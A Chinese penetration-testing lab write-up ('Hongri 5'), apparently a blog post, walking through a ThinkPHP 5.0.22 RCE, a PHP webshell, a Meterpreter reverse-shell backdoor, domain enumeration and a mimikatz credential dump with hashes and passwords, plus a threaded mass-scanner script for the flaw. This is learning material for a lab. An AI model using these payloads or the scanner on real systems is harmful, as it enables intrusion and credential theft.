---

title: 红日5靶场
date: 2026-04-08
categories:

  - 红日靶场
tags:
  - 渗透靶场

---

# 环境搭建
## 虚拟机密码
win7	sun\heart 		     123.com

   sun\Administrator 	dc123.com

2008	 sun\admin                   2020.com



## 网络
win7  外网 IP： 192.168.135.150

   内网 IP：192.168.138.136

2008 内网 IP：192.168.138.138



记得把 win7 防火墙关掉，不然其他机器没法去 ping 通 win7



<!-- 这是一张图片，ocr 内容为： -->
![2008](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458491.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459871.png)





## win7 开启 web 服务：
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459400.png)



访问 192.168.135.150 ：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456984.png)





# <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">信息搜集</font>


## 扫描端口：
```bash
┌──(xvsf㉿kali)-[~]
└─$ nmap -Pn 192.168.135.150
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 09:41 -0400
Nmap scan report for 192.168.135.150
Host is up (0.00029s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
MAC Address: 00:0C:29:32:9B:B7 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.22 seconds
                                                                                                                     
┌──(xvsf㉿kali)-[~]
└─$ 

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458292.png)







## ThinkPHP V5
80 端口是 ThinkPHP V5.0 版本，搜索看看有哪些漏洞：

[https://y4er.com/posts/thinkphp5-rce/](https://y4er.com/posts/thinkphp5-rce/)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500807.png)



存在漏洞：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500981.png)

确定 thinkphp 具体版本：

> <font style="color:rgb(35, 57, 77);">为了确定具体版本，这里先使用报错查看，发现这里的版本为5.0.22，如果没记错的话这里是有一个tp远程命令执行漏洞的</font>
>
> <font style="color:rgb(35, 57, 77);background-color:rgb(246, 246, 246);">漏洞描述：由于thinkphp对框架中的核心Requests类的method方法提供了表单请求伪造，该功能利用</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">$_POST['_method']</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(246, 246, 246);">来传递真实的请求方法。但由于框架没有对参数进行验证，导致攻击者可以设置</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">$_POST['_method']='__construct'</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(246, 246, 246);">而让该类的变量被覆盖。攻击者利用该方式将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行执行任意命令。</font>
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457296.png)

版本为：[<font style="color:rgb(134, 134, 134);">ThinkPHP</font>](http://www.thinkphp.cn/)<font style="color:rgb(51, 51, 51);"> V5.0.22 </font>

<font style="color:rgb(51, 51, 51);"></font>

kali 中搜索：有一个 5.X 的 RCE

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458855.png)

并且也有相关的 POC

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500494.png)

```bash
POC：

thinkphp 5.0.22
1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username
2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password
3、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

```

<font style="color:rgb(51, 51, 51);"></font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459664.png)



```bash
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457607.png)



<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">看一下进程，发现无杀软那么不用免杀直接写webshell</font>

```bash
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist /svc
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457669.png)







<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">echo写一句话木马进去，因为之前查看过没有杀软，这里就不需要做免杀处理</font>

```bash
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "<?php @eval($_POST[cmd]);?>" > shell.php
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458931.png)

成功写入：

```bash
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456719.png)



蚁剑连接：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456445.png)









#### <font style="color:rgb(35, 57, 77);">thinkphp批量检测</font>
**出自：**[**https://drunkmars.top/2021/07/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/**](https://drunkmars.top/2021/07/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/)

> <font style="color:rgb(35, 57, 77);">这里我思考了一个问题，thinkphp的版本这么多，如果kali里面的漏洞库没有，而在搜索引擎上去搜索又太耗费时间，有没有一个批量检测thinkphp漏洞的脚本呢？</font>
>
> <font style="color:rgb(35, 57, 77);">这里我找到了一个thinkphp漏洞批量检测的脚本</font>
>

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: thinkphp远程代码检测
description: ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
'''


import re
import sys
import requests
import queue
import threading
from bs4 import BeautifulSoup
class thinkphp_rce(threading.Thread):
    def __init__(self, q):
        threading.Thread.__init__(self)
        self.q = q
    def run(self):
        while not self.q.empty():
            url=self.q.get()
            headers = {"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"}
            payload = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
            vulnurl = url + payload
            try:
                response = requests.get(vulnurl, headers=headers, timeout=3, verify=False, allow_redirects=False)

                soup = BeautifulSoup(response.text,"lxml")
                if 'PHP Version' in str(soup.text):
                    print ('[+] Remote code execution vulnerability exists at the target address')
                    print ('[+] Vulnerability url address ' + vulnurl)
                    with open('target.txt','a') as f1:
                        f1.write(vulnurl+'\n')
                    f1.close()
                else:
                    print ('[-] There is no remote code execution vulnerability in the target address')
            except:
                print ('[!] Destination address cannot be connected')
def urlget():
    with open('url.txt','r')as f:
        urls=f.readlines()
        for tmp in urls:
            if '//' in tmp:
                url=tmp.strip('\n')
                urlList.append(url)
            else:
                url='http://'+tmp.strip('\n')
                urlList.append(url)
        return(urlList)
    f.close()

if __name__=="__main__":
    print('''----------------扫描开始-------------------

*Made by  :tdcoming
*For More :https://t.zsxq.com/Ai2rj6E
*MY Heart :https://t.zsxq.com/A2FQFMN


              _______   _                         _               
             |__   __| | |                       (_)              
                | |  __| |  ___  ___   _ __ ___   _  _ __    __ _ 
                | | / _` | / __|/ _ \ | '_ ` _ \ | || '_ \  / _` |
                | || (_| || (__| (_) || | | | | || || | | || (_| |
                |_| \__,_| \___|\___/ |_| |_| |_||_||_| |_| \__, |
                                                             __/ |
                                                            |___/ 
            ''')
    urlList=[]
    urlget()
    threads = []
    threads_count = 10
    q=queue.Queue()
    for url in urlList:
        q.put(url)
    for i in range(threads_count):
        threads.append(thinkphp_rce(q))
    for i in threads:
        i.start()
    for i in threads:
        i.join()
```

> <font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">这里的使用方法很简单：将要检测的目标放在url.txt里面，如果存在漏洞的地址将自动生成一个target.txt文本保存</font>
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459517.png)

<font style="color:rgb(35, 57, 77);"></font>

<font style="color:rgb(35, 57, 77);"></font>

<font style="color:rgb(35, 57, 77);"></font>

# <font style="color:rgb(35, 57, 77);">漏洞利用</font>
## <font style="color:rgb(35, 57, 77);">蚁剑信息收集</font>


通过之前的 thinkphp 5.0 的 RCE 漏洞，上传了 shell.php，并且蚁剑连接成功，接下来对内网的信息进行收集：



首先看到当前的用户权限是 Administrator

并且暴露了内网 IP：192.168.138.136

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457763.png)



<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">查看一下域信息：”</font>

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459860.png)







### 内网渗透


#### 上线 msf：
kali 生成一个后门：

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.135.128 LPORT=4444 -f exe > abc.exe`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459846.png)



将 abc.exe 通过蚁剑上传



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500365.png)



执行 abc.exe

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457809.png)



<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">msf 开启监听</font>

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">上线成功：</font>

```bash
msf > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.135.128
lhost => 192.168.135.128
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.135.128:4444 
[*] Sending stage (190534 bytes) to 192.168.135.150
[*] Meterpreter session 1 opened (192.168.135.128:4444 -> 192.168.135.150:49259) at 2026-04-06 10:08:50 -0400

meterpreter > getuid
Server username: SUN\Administrator
meterpreter > 

```

#### 内网信息收集


尝试 getsystem 提权：

```bash
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

```



<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">对域进行信息搜集</font>

```bash
meterpreter > shell 
Process 2620 created.
Channel 1 created.
Microsoft Windows [°汾 6.1.7601]
°爨̹Ԑ (c) 2009 Microsoft Corporation¡£±£´̹ԐȨ{¡£

C:\Windows\system32>chcp 65001
chcp 65001
Active code page: 65001

C:\Windows\system32>net user /domain
net user /domain
The request will be processed at a domain controller for domain sun.com.


User accounts for \\DC.sun.com

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
krbtgt                   leo                      
The command completed with one or more errors.


C:\Windows\system32>net group "domain computers" /domain
net group "domain computers" /domain
The request will be processed at a domain controller for domain sun.com.

Group name     Domain Computers
Comment        ¼Ԉ뵽Բאµŋ𐹤طվºͷþϱǷ

Members

-------------------------------------------------------------------------------
WIN7$                    
The command completed successfully.


C:\Windows\system32>net group "domain controllers" /domain
net group "domain controllers" /domain
The request will be processed at a domain controller for domain sun.com.

Group name     Domain Controllers
Comment        Բא̹ԐԲ¿ٖǆ

Members

-------------------------------------------------------------------------------
DC$                      
The command completed successfully.


C:\Windows\system32>net group "domain admins" /domain
net group "domain admins" /domain
The request will be processed at a domain controller for domain sun.com.

Group name     Domain Admins
Comment        ָ¶¨µœ򺝀

Members

-------------------------------------------------------------------------------
Administrator            
The command completed successfully.


C:\Windows\system32>

```

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">只有一个域控，这里直接ping一下域控得到域控 ip 为 192.168.138.138</font>

```bash
C:\Windows\system32>ping DC.sun.com
ping DC.sun.com

Pinging dc.sun.com [192.168.138.138] with 32 bytes of data:
Reply from 192.168.138.138: bytes=32 time<1ms TTL=128
Reply from 192.168.138.138: bytes=32 time<1ms TTL=128
Reply from 192.168.138.138: bytes=32 time<1ms TTL=128
Reply from 192.168.138.138: bytes=32 time<1ms TTL=128

Ping statistics for 192.168.138.138:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms

C:\Windows\system32>

```



#### <font style="color:rgb(35, 57, 77);">获取凭证</font>
```bash
C:\Windows\system32>^C
Terminate channel 1? [y/N]  y
meterpreter > background 
[*] Backgrounding session 1...
msf exploit(multi/handler) > route add 192.168.138.0 255.255.255.0 1
[*] Route added
msf exploit(multi/handler) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.138.0      255.255.255.0      Session 1

[*] There are currently no IPv6 routes defined.
msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > run autoroute -s 192.168.138.0/24
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.168.138.0/255.255.255.0...
[-] Could not add route
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.138.0      255.255.255.0      Session 1

meterpreter > 

```

<font style="color:rgb(35, 57, 77);"></font>

<font style="color:rgb(35, 57, 77);"></font>

```bash
load kiwi  # 加载 kiwi 模块
kiwi_cmd privilege::debug  #privilege::debug 用于开启 SeDebugPrivilege 权限。
ps
migrate 1596  #进程迁移，因为我们这里上线到msf的载荷是32位的(即x86)，这里需要找一个64位的(即x64)进行进程迁移才能使用kiwi获取靶机密码

kiwi_cmd sekurlsa::logonPasswords  # 通过读取 lsass.exe（本地安全授权子系统服务）的内存，提取已登录用户的凭据

```

<font style="color:rgb(35, 57, 77);"></font>

```bash
meterpreter > 
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
meterpreter > kiwi_cmd privilege::debug
Privilege '20' OK

meterpreter > ps

Process List
============

 PID   PPID  Name                Arch  Session  User                          Path
 ---   ----  ----                ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System              x64   0
 256   4     smss.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 340   324   csrss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 344   400   conhost.exe         x64   1        SUN\Administrator             C:\Windows\System32\conhost.exe
 356   492   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 392   324   wininit.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 400   384   csrss.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 456   384   winlogon.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 492   392   services.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 500   392   lsass.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 508   392   lsm.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 584   2388  httpd.exe           x86   1        SUN\Administrator             C:\phpStudy\PHPTutorial\Apache\bin\ht
                                                                              tpd.exe
 628   492   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 644   584   cmd.exe             x86   1        SUN\Administrator             C:\Windows\SysWOW64\cmd.exe
 696   492   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 748   492   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 780   876   dwm.exe             x64   1        SUN\leo                       C:\Windows\System32\dwm.exe
 848   400   conhost.exe         x64   1        SUN\leo                       C:\Windows\System32\conhost.exe
 876   492   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 916   492   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1048  492   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1140  492   spoolsv.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1176  492   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1216  1504  phpStudy.exe        x86   1        SUN\Administrator             C:\phpStudy\phpStudy.exe
 1372  492   VGAuthService.exe   x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\
                                                                              VMware VGAuth\VGAuthService.exe
 1440  628   dllhost.exe         x64   1        SUN\Administrator             C:\Windows\System32\dllhost.exe
 1452  1584  explorer.exe        x64   1        SUN\leo                       C:\Windows\explorer.exe
 1480  644   cmd.exe             x86   1        SUN\Administrator             C:\Windows\SysWOW64\cmd.exe
 1528  492   taskhost.exe        x64   1        SUN\leo                       C:\Windows\System32\taskhost.exe
 1572  492   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1596  628   WmiPrvSE.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 1636  1452  powershell.exe      x64   1        SUN\leo                       C:\Windows\System32\WindowsPowerShell
                                                                              \v1.0\powershell.exe
 1820  492   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1904  492   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1944  492   sppsvc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2024  492   SearchIndexer.exe   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2100  1480  abc.exe             x86   1        SUN\Administrator             C:\phpStudy\PHPTutorial\WWW\public\ab
                                                                              c.exe
 2168  628   slui.exe            x64   1        SUN\leo                       C:\Windows\System32\slui.exe
 2180  3008  ielowutil.exe       x86   1        SUN\leo                       C:\Program Files (x86)\Internet Explo
                                                                              rer\IELowutil.exe
 2348  492   wmpnetwk.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Windows Media Player
                                                                              \wmpnetwk.exe
 2388  1216  httpd.exe           x86   1        SUN\Administrator             C:\phpStudy\PHPTutorial\Apache\bin\ht
                                                                              tpd.exe
 2808  400   conhost.exe         x64   1        SUN\Administrator             C:\Windows\System32\conhost.exe
 3040  1216  mysqld.exe          x86   1        SUN\Administrator             C:\phpStudy\PHPTutorial\MySQL\bin\mys
                                                                              qld.exe
 3532  492   VSSVC.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\VSSVC.exe
 3576  492   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3724  492   TrustedInstaller.e  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller
             xe                                                               .exe

meterpreter > migrate 1596
[*] Migrating from 2100 to 1596...
[*] Migration completed successfully.
meterpreter > kiwi_cmd sekurlsa::logonPasswords

Authentication Id : 0 ; 489992 (00000000:00077a08)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : SUN
Logon Server      : DC
Logon Time        : 2026/4/6 21:34:20
SID               : S-1-5-21-3388020223-1982701712-4030140183-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : SUN
	 * LM       : c8c42d085b5e3da2e9260223765451f1
	 * NTLM     : e8bea972b3549868cecd667a64a6ac46
	 * SHA1     : 3688af445e35efd8a4d4e0a9eb90b754a2f3a4ee
	tspkg :	
	 * Username : Administrator
	 * Domain   : SUN
	 * Password : dc123.com
	wdigest :	
	 * Username : Administrator
	 * Domain   : SUN
	 * Password : dc123.com
	kerberos :	
	 * Username : Administrator
	 * Domain   : SUN.COM
	 * Password : dc123.com
	ssp :	
	credman :	

Authentication Id : 0 ; 423010 (00000000:00067462)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : SUN
Logon Server      : DC
Logon Time        : 2026/4/6 21:29:24
SID               : S-1-5-21-3388020223-1982701712-4030140183-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : SUN
	 * LM       : c8c42d085b5e3da2e9260223765451f1
	 * NTLM     : e8bea972b3549868cecd667a64a6ac46
	 * SHA1     : 3688af445e35efd8a4d4e0a9eb90b754a2f3a4ee
	tspkg :	
	 * Username : Administrator
	 * Domain   : SUN
	 * Password : dc123.com
	wdigest :	
	 * Username : Administrator
	 * Domain   : SUN
	 * Password : dc123.com
	kerberos :	
	 * Username : Administrator
	 * Domain   : SUN.COM
	 * Password : dc123.com
	ssp :	
	credman :	

Authentication Id : 0 ; 190476 (00000000:0002e80c)
Session           : Interactive from 1
User Name         : leo
Domain            : SUN
Logon Server      : DC
Logon Time        : 2026/4/6 21:18:24
SID               : S-1-5-21-3388020223-1982701712-4030140183-1110
	msv :	
	 [00000003] Primary
	 * Username : leo
	 * Domain   : SUN
	 * LM       : b73a13e9b7832a35aad3b435b51404ee
	 * NTLM     : afffeba176210fad4628f0524bfe1942
	 * SHA1     : fa83a92197d9896cb41463b7a917528b4009c650
	tspkg :	
	 * Username : leo
	 * Domain   : SUN
	 * Password : 123.com
	wdigest :	
	 * Username : leo
	 * Domain   : SUN
	 * Password : 123.com
	kerberos :	
	 * Username : leo
	 * Domain   : SUN.COM
	 * Password : 123.com
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2026/4/6 21:15:54
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN7$
Domain            : SUN
Logon Server      : (null)
Logon Time        : 2026/4/6 21:15:54
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : WIN7$
	 * Domain   : SUN
	 * NTLM     : d1995ce878adf4ea44467077afa31384
	 * SHA1     : 335040b6fc0c9ace0f90d05eeceb8e8d7afaa4f2
	tspkg :	
	wdigest :	
	 * Username : WIN7$
	 * Domain   : SUN
	 * Password : b1 6c a7 36 c4 b9 23 6f 04 45 96 94 42 47 05 03 a3 35 a0 41 fe aa e0 92 b2 61 32 d1 c5 cf 8e 55 a1 52 1e 34 ee 31 7b d3 82 2d 20 f2 53 9f cb 75 f3 8f 9e 74 de d7 cc 37 06 53 3a e5 64 b1 d5 be 59 0c 8e 0d cd 0a 5f 7e fd b2 ba 6a d3 81 2e d4 f8 99 0f 42 66 88 15 01 40 05 ab 70 d9 04 0c 88 09 e2 5b fe 18 81 4e a8 52 c1 65 81 65 ac c8 c3 43 81 ff 59 cd c4 77 fe 9a 19 f7 4b db 36 97 f9 31 4e a3 c3 36 ba c7 a9 b5 c8 59 dc 29 ec f3 34 1a 83 c1 ab a1 63 d4 6e cb c6 8a 78 d0 23 80 de 30 0a d7 82 d1 73 a7 1a 15 1a 53 c9 6d 7b 54 73 08 69 8e 1d 21 df 5b 56 0b 50 ce fe 6f 89 a8 4c f5 8d 37 0f 10 54 44 6a 33 65 a0 fa 1d c7 88 d4 ff b0 cc 27 65 98 17 7f 29 94 e4 d9 62 aa 43 12 ca a7 49 56 95 b3 48 98 b4 41 24 59 db 8a 03 00 
	kerberos :	
	 * Username : win7$
	 * Domain   : SUN.COM
	 * Password : b1 6c a7 36 c4 b9 23 6f 04 45 96 94 42 47 05 03 a3 35 a0 41 fe aa e0 92 b2 61 32 d1 c5 cf 8e 55 a1 52 1e 34 ee 31 7b d3 82 2d 20 f2 53 9f cb 75 f3 8f 9e 74 de d7 cc 37 06 53 3a e5 64 b1 d5 be 59 0c 8e 0d cd 0a 5f 7e fd b2 ba 6a d3 81 2e d4 f8 99 0f 42 66 88 15 01 40 05 ab 70 d9 04 0c 88 09 e2 5b fe 18 81 4e a8 52 c1 65 81 65 ac c8 c3 43 81 ff 59 cd c4 77 fe 9a 19 f7 4b db 36 97 f9 31 4e a3 c3 36 ba c7 a9 b5 c8 59 dc 29 ec f3 34 1a 83 c1 ab a1 63 d4 6e cb c6 8a 78 d0 23 80 de 30 0a d7 82 d1 73 a7 1a 15 1a 53 c9 6d 7b 54 73 08 69 8e 1d 21 df 5b 56 0b 50 ce fe 6f 89 a8 4c f5 8d 37 0f 10 54 44 6a 33 65 a0 fa 1d c7 88 d4 ff b0 cc 27 65 98 17 7f 29 94 e4 d9 62 aa 43 12 ca a7 49 56 95 b3 48 98 b4 41 24 59 db 8a 03 00 
	ssp :	
	credman :	

Authentication Id : 0 ; 47347 (00000000:0000b8f3)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2026/4/6 21:15:54
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : WIN7$
	 * Domain   : SUN
	 * NTLM     : d1995ce878adf4ea44467077afa31384
	 * SHA1     : 335040b6fc0c9ace0f90d05eeceb8e8d7afaa4f2
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN7$
Domain            : SUN
Logon Server      : (null)
Logon Time        : 2026/4/6 21:15:54
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WIN7$
	 * Domain   : SUN
	 * Password : b1 6c a7 36 c4 b9 23 6f 04 45 96 94 42 47 05 03 a3 35 a0 41 fe aa e0 92 b2 61 32 d1 c5 cf 8e 55 a1 52 1e 34 ee 31 7b d3 82 2d 20 f2 53 9f cb 75 f3 8f 9e 74 de d7 cc 37 06 53 3a e5 64 b1 d5 be 59 0c 8e 0d cd 0a 5f 7e fd b2 ba 6a d3 81 2e d4 f8 99 0f 42 66 88 15 01 40 05 ab 70 d9 04 0c 88 09 e2 5b fe 18 81 4e a8 52 c1 65 81 65 ac c8 c3 43 81 ff 59 cd c4 77 fe 9a 19 f7 4b db 36 97 f9 31 4e a3 c3 36 ba c7 a9 b5 c8 59 dc 29 ec f3 34 1a 83 c1 ab a1 63 d4 6e cb c6 8a 78 d0 23 80 de 30 0a d7 82 d1 73 a7 1a 15 1a 53 c9 6d 7b 54 73 08 69 8e 1d 21 df 5b 56 0b 50 ce fe 6f 89 a8 4c f5 8d 37 0f 10 54 44 6a 33 65 a0 fa 1d c7 88 d4 ff b0 cc 27 65 98 17 7f 29 94 e4 d9 62 aa 43 12 ca a7 49 56 95 b3 48 98 b4 41 24 59 db 8a 03 00 
	kerberos :	
	 * Username : win7$
	 * Domain   : SUN.COM
